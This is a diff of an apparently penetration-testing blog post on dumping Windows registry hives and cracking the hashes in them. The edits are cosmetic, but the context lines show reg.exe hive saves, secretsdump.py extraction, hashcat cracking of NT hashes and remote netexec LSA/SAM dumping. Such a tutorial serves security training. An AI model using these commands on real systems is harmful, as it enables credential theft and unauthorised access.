@@ -17,13 +17,13 @@ With administrative access to a Windows system, we can quickly dump the files as
 
 These hives can be copied using `reg.exe`. This requires **SYSTEM** privileges.
 
-```cmd
+```powershell
 reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
 
-![Extracting the SAM, SYSTEM and SECURITY hives with reg.exe](/assets/img/posts/dumping-sam-hashes-windows/reg-save.png){: .normal }
+![Extracting the SAM, SYSTEM and SECURITY hives with reg.exe](/assets/img/posts/dumping-sam-hashes-windows/reg-save.png)
 _Extracting the registry hives locally with reg.exe_
 
 ## Cracking the Hashes
@@ -37,7 +37,7 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
 
 It's important to always extract `HKLM\SYSTEM` together with `HKLM\SAM`, because `HKLM\SYSTEM` holds the boot key, which is required to decrypt `HKLM\SAM`.
 
-![Output of secretsdump.py showing the dumped hashes](/assets/img/posts/dumping-sam-hashes-windows/secretsdump-output.png){: .normal }
+![Output of secretsdump.py showing the dumped hashes](/assets/img/posts/dumping-sam-hashes-windows/secretsdump-output.png)
 _Dumping the hashes offline with secretsdump_
 
 Pay attention to the output line `Dumping local SAM hashes (uid:rid:lmhash:nthash)`, which specifies the hash type. We can save the hashes to a file and use hashcat to crack them:
@@ -46,7 +46,7 @@ Pay attention to the output line `Dumping local SAM hashes (uid:rid:lmhash:nthas
 sudo hashcat -m 1000 hashesfile.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![hashcat cracking the extracted NT hashes](/assets/img/posts/dumping-sam-hashes-windows/hashcat-cracked.png){: .normal }
+![hashcat cracking the extracted NT hashes](/assets/img/posts/dumping-sam-hashes-windows/hashcat-cracked.png)
 _Cracking the extracted hashes with hashcat_
 
 ## HKLM\SECURITY: Cached Domain Credentials and DPAPI
@@ -70,7 +70,6 @@ netexec smb <ip> --local-auth -u <user> -p <password> --lsa
 netexec smb <ip> --local-auth -u <user> -p <password> --sam
 ```
 
-![netexec extracting LSA secrets remotely](/assets/img/posts/dumping-sam-hashes-windows/netexec-lsa-sam.png){: .normal }
+![netexec extracting LSA secrets remotely](/assets/img/posts/dumping-sam-hashes-windows/netexec-lsa-sam.png)
 _Remote extraction of LSA secrets with netexec_
 
-In this image, we can see saved credentials in memory.
